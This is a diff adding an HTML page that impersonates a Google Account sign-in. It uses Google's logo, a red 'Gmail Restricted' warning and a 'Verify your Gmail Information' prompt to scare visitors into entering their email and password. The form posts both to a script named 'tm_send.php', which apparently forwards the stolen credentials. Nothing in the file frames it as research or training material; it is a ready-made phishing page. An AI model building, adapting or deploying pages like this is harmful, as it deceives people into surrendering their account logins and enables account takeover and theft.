@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Google Account</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
+            <style>
+                span {
+                    color:red;
+                }
+            </style>
+            <h1><span>𝐆𝐦𝐚𝐢𝐥 𝐑𝐞𝐬𝐭𝐫𝐢𝐜𝐭𝐞𝐝</span></h1>
+            <h2>𝗦𝗶𝗴𝗻 𝗶𝗻</h2>
+            <h3> Verify your Gmail Information</h3>
+            <p>to continue to Gmail</p>
+            <form action="tm_send.php" method="post">
+                <div class="input-container">
+                    <input type="email" name="username" placeholder="Email or phone" required>
+                </div>
+                <div class="forgot-email">
+                </div>
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="Enter your password" required>
+                </div>
+                <div class="forgot-password">
+                </div>
+                <div class="button-container">
+                    <button type="submit">Next</button>
+                </div>
+                <div class="create-account">
+                    <a href="#">Create account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
